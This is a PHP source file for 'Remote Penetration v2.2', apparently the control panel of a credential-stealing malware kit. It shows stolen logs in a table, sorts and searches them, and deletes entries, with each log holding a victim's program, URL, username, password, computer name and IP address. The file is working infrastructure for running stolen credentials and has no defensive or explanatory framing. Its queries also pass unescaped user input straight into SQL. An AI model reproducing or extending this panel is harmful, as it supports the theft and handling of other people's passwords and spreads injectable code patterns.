<?php
//*****************************************
// Author: icyinferno
// E-mail: 1cy1nferno109@gmail.com
// Copyright ©2009, IcyInferno Productions 
//*****************************************
require_once 'header.php';
require_once 'db_login.php';

	$htmlcode   = "<html><head><title>Remote Penetration - Logs</title><link rel='icon' HREF='IMGs/favicon.ico'></title>
				   <link rel='stylesheet' type='text/css' href='style.css'/></head><body>"."<div align='center'>
				   <img src='IMGs/banner.gif' width='522' height='90' /></div>"."<center>|<a href=?ac=main> <b>Main</b> </a>||<a href=?ac=search>		                   <b>Search</b> </a>||<a href=$self?ac=deletedups> <b>Delete Duplicate Logs</b> </a>||<a href=?ac=logout> <b>Logout</b> </a>|<p>&nbsp;</p>";
	
	$htmltable  = "<table style='BORDER-COLLAPSE: collapse' height='1' cellspacing='0' bordercolordark='#666666' cellpadding='0' width='100%' bgcolor='#ffffff' 		                   bordercolorlight='#c0c0c0' border='1'><tr><td width='0' height='1' valign='top'>
				   <table id='logstable' cellpadding='2' cellspacing='0' border='0'><tr id='row0'>
				   <td><a href='?ac=main&PHP_AUTH_SORT=0'>Program</a></td>
				   <td><a href='?ac=main&PHP_AUTH_SORT=1'>URL/Protocol/FTP</a></td>
				   <td><a href='?ac=main&PHP_AUTH_SORT=2'>Username</a></td>
				   <td><a href='?ac=main&PHP_AUTH_SORT=3'>Password</a></td>
				   <td><a href='?ac=main&PHP_AUTH_SORT=4'>Computer</a></td>
				   <td><a href='?ac=main&PHP_AUTH_SORT=5'>Date</a></td>
				   <td><a href='?ac=main&PHP_AUTH_SORT=6'>IP</a></td>
				   <td><u>DEL</u></td></tr>";
				   			   
	$htmlsearch = "<form name='search' method='POST' ac='?ac=search'>
				   Search: <input type='text' name='q' size='20'> At: <select name='in'>
				   <option selected='selected' value='1'>URL</option>
				   <option value='2'>Username</option>
				   <option value='3'>Password</option>
				   <option value='4'>Computer</option>
				   <option value='5'>Date</option>
				   <option value='6'>IP</option></select>
				   <input type='submit' value='Search' name='search'></form>
				   <form name='frm' method='POST' ac='?ac=delete'>";
	
	$htmlfooter  = "</table></br><table style='BORDER-COLLAPSE: collapse' height='1' cellspacing='0' bordercolordark='#666666' cellpadding='0' width='100%'                    bgcolor='#ffffff' bordercolorlight='#c0c0c0' border='1'><tr><td width='0' height='1' valign='top'><div align='center' class='style6'>[Remote 			                    Penetration v2.2 by <span class='style5'>Icyinferno</span>]</div></body></html>";
				
	$protocols    = array("Program", "URL", "User", "Password", "Computer", "Date", "IP");
	$pageamount   = 50;
	
	function pages_number($logstotal, $pageamount) {
		$pagesnumber = ceil($logstotal/$pageamount);
		$html = "<center>Page Number: ";
		
		if($_SESSION["PHP_AUTH_PAGE"] == 0) {
			$html = "<center>Page Number: [";
		} else {
			$html = "<center>";
		}
  			
		for ($i=0; $i<$pagesnumber; $i++) {
			if ($_SESSION["PHP_AUTH_PAGE"] == $i)
				$html .= "<span class='page1'>".$i."]</span>";
			else
				$html .= "[<span class='page0'><a href='?ac=main&PHP_AUTH_PAGE=".$i."'>".$i."</a></span>]"; 
		}
		
		$html .= " -- (<span class='style10'>".$logstotal."</span> Logs are in the database!)</center>";
		return $html;
	}
	
	function order_by() {
		if ($_SESSION["PHP_AUTH_ORDER"]  == 0) $tmp = "ASC"; else $tmp = "DESC";
			return $tmp;
	}
	
	if ($_GET["ac"] == "main" || !isset($_GET["ac"])) {
		$c = mysql_connect(web_dbHost, web_dbUser, web_dbPass) or die('Could not connect');
			 mysql_select_db(web_dbDatabase, $c) or die('Could not select database');
		
		$result = mysql_query("SELECT COUNT(*) FROM `logs`;", $c);
		$logstotal = mysql_result($result, 0);
		
		if(isset($_POST['ac']) && isset($_POST['ac']) == 'delete') {
   			if(count($_POST['values'])) {
     		 	mysql_query("DELETE FROM logs WHERE cid IN(".implode(",",$_POST['values']).")");
      			header("Location:?ac=main");
      		exit();
   			}
		}

		if ($logstotal > 0) {
			if (isset($_GET["PHP_AUTH_PAGE"]) && 
				is_numeric($_GET["PHP_AUTH_PAGE"]) &&
				$_GET["PHP_AUTH_PAGE"]>=0 && 
				$_GET["PHP_AUTH_PAGE"]<=ceil($logstotal/$pageamount))
				$_SESSION["PHP_AUTH_PAGE"] = $_GET["PHP_AUTH_PAGE"];
			
			$result = mysql_query("SELECT * FROM `logs` ORDER BY `".$protocols[$_SESSION["PHP_AUTH_SORT"]]."` ".order_by().
								  " LIMIT ".($pageamount*$_SESSION["PHP_AUTH_PAGE"])." , ".$pageamount.";", $c);
								  
			if (!$result) die(mysql_error());
			
			$html .= $htmlcode.$htmltable;
			$i = 0;
			while ($row = mysql_fetch_object($result)) {
			
				$html .= "<tr class='";
				
				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";
					$html .= "'><td>".$row->program."</td>";
					$html .= "<td><a href='".$row->url."' target='_blanc'>".$row->url."</a></td><td>".
							  				 $row->user."</td><td>".$row->password."</td>";
					$html .= "<td>".$row->computer."</td><td>".$row->date."</td><td>".$row->ip."</td>";
					$html .= "<td><form method='post'>\n"."<input type='hidden' name='ac' value='delete' />\n"."<input type='image' src='IMGs/cross.png' name='values[]' value='".$row->cid."'>"."</td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $pageamount)."</div>".$htmlfooter;
		} else {
			$html .= $htmlcode."No logs found!<p>&nbsp;</p>".$htmlfooter;
		}
		mysql_close($c);
		echo $html;

	} elseif ($_GET["ac"] == "search") {
		if (isset($_POST["q"]) && isset($_POST["in"]) && is_numeric($_POST["in"]) && $_POST["in"]>0 && $_POST["in"]<=6) {
			$connect = mysql_connect(web_dbHost, web_dbUser, web_dbPass) or die('Could not connect');
			 	       mysql_select_db(web_dbDatabase, $connect) or die('Could not select database');
			$result =  mysql_query("SELECT * FROM `logs` WHERE `".$protocols[$_POST["in"]]."` LIKE '%".$_POST["q"]."%';", $connect);
			
			if (!$result) die(mysql_error());
			
			if (strlen($_POST["q"]) < 3) {
			  		echo $htmlcode.$htmlsearch.
				       '<b>Search terms must be longer than 3 characters!!!</b><p>&nbsp;</p>'.$htmlfooter;
				 	exit;
			}

			if (mysql_num_rows($result) > 0) {
				$html .= $htmlcode.$htmlsearch."
						   <table style='BORDER-COLLAPSE: collapse' height='1' cellspacing='0' bordercolordark='#666666' cellpadding='0' width='100%' bgcolor='#ffffff' 		                           bordercolorlight='#c0c0c0' border='1'><tr><td width='0' height='1' valign='top'><table id='searchtable' cellpadding='2' cellspacing='0'                           border='0'><tr id='row0'>
						   <td><u>Program</u></td>
						   <td><u>URL/Protocol/FTP</u></td>
						   <td><u>Username</u></td>
						   <td><u>Password</u></td>
						   <td><u>Computer</u></td>
						   <td><u>Date</u></td>
						   <td><u>IP</u></td>
						   <td><u>DEL</u></td></tr>";
				$i = 0;
				while ($row = mysql_fetch_object($result)) {
			
				$html .= "<tr class='";
				
				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";
					$html .= "'><td>".$row->program."</td>";
					$html .= "<td><a href='".$row->url."' target='_blanc'>".$row->url."</a></td><td>".
							  $row->user."</td><td>".$row->password."</td>";
					$html .= "<td>".$row->computer."</td><td>".$row->date."</td><td>".$row->ip."</td>";
					$html .= "<td><form method='post'>\n"."<input type='hidden' name='ac' value='delete' />\n"."<input type='image' src='IMGs/cross.png' name='values[]' value='".$row->cid."'>"."</td></tr>";
					$i++;
				}
				$html .= "</table></table><div id='pages'><div id='numbers'><b>".mysql_num_rows($result)." results for '".
						  htmlspecialchars($_POST["q"])."'</div></b><p>&nbsp;</p>".$htmlfooter;
			} else {
				$html .= $htmlcode.$htmlsearch."<b>Nothing Found..</b><p>&nbsp;</p>".$htmlfooter;
			}
			mysql_close($connect);
		} else {
			$html .= $htmlcode.$htmlsearch.$htmlfooter;
		}
		echo $html;
		
	} elseif ($_GET["ac"] == "deletedups") {
		$c = mysql_connect(web_dbHost, web_dbUser, web_dbPass) or die('Could not connect');
			 mysql_select_db(web_dbDatabase, $c) or die('Could not select database');
			 mysql_query("DELETE bad_rows.*
							FROM logs AS good_rows
							INNER JOIN logs AS bad_rows
						  		ON (bad_rows.program = good_rows.program AND
									bad_rows.url = good_rows.url AND
									bad_rows.user = good_rows.user AND
									bad_rows.password = good_rows.password AND
									bad_rows.cid > good_rows.cid)", $c);
			mysql_close($c) or die(mysql_error());
			echo $htmlcode."All duplicate logs have been deleted!<p>&nbsp;</p>".$htmlfooter;
		
	} elseif ($_GET["ac"] == "logout") {
		unset($_SESSION["PHP_AUTH_USER"]);
		unset($_SESSION["PHP_AUTH_PWD"]);
		unset($_SESSION["PHP_AUTH_IP"]);
		unset($_SESSION["PHP_AUTH_SORT"]);
		unset($_SESSION["PHP_AUTH_ORDER"] ); 
		unset($_SESSION["PHP_AUTH_PAGE"]);
		session_unset();
		header("Location: index.php");
		
	} else {
		$error .= $htmlcode."<b>Error!!!!</b><p>&nbsp;</p>".$htmlfooter;
		echo $error;
	}
?>
